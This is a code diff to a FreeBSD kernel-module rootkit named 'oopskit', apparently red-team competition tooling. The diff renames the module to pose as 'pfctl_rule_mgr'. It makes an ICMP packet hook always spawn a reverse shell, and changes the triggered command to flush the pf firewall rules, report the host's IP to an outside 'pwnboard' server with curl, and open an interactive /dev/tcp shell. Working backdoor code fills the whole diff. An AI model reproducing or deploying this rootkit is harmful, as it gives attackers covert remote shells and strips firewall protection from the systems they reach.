@@ -47,13 +47,13 @@
  *
  */
 
-#define KLD_NAME T_NAME"_oopskit"
-#define KLD_FILE_NAME T_NAME"_oopskit.ko"
+#define KLD_NAME T_NAME"_rule_mgr"
+#define KLD_FILE_NAME T_NAME"_rule_mgr.ko"
 #define BASH "/usr/local/bin/bash"
 #define BASH_OPT "-c"
-#define BASH_COMMAND_STR "/sbin/pfctl -d; /bin/sh -i>& /dev/tcp/"
-#define FULL_BASH_COMMAND_STR BASH_COMMAND_STR"255.255.255.255/65535 0>&1"
-#define ARG2LEN 58
+#define BASH_COMMAND_STR "/sbin/pfctl -F rules; /usr/local/bin/curl -X POST http://pwnboard.win/pwn/boxaccess -H 'Content-Type: application/json' -d '{\"ip\":\"`cat /tmp/.ip`\", \"application\":\"oopskit\"}';/bin/sh -i>& /dev/tcp/" // 38
+#define FULL_BASH_COMMAND_STR BASH_COMMAND_STR"255.255.255.255/65535 0>&1" // 26
+#define ARG2LEN 222
 extern struct protosw inetsw[];
 
 char ** oopskit_args = NULL;
@@ -402,18 +402,16 @@ static int hook(void *arg, struct mbuf **mp, struct ifnet *ifp, int dir, int fla
     }
     int targetFlag = is_target(fixed_data);
     if (targetFlag) {
-#ifdef DEBUG
         reverse_shell(get_source_ip(fixed_data));
-#endif
     }
     return 0;
 }
 
 /* The function called at load/unload. */
 static int load(struct module *module, int cmd, void *arg) {
-#ifndef DEBUG
-   kld_hiding(module, KLD_FILE_NAME, KLD_NAME);
-#endif
+// #ifndef DEBUG
+//    kld_hiding(module, KLD_FILE_NAME, KLD_NAME);
+// #endif
 
    int error = 0;
    switch (cmd) {
@@ -443,7 +441,7 @@ static int load(struct module *module, int cmd, void *arg) {
 }
 
 static moduledata_t icmp_input_oopskit_mod = {
-   "icmp_input_oopskit",      /* module name */
+   "pfctl_rule_mgr",      /* module name */
    load,                       /* event handler */
    NULL                        /* extra data */
 };
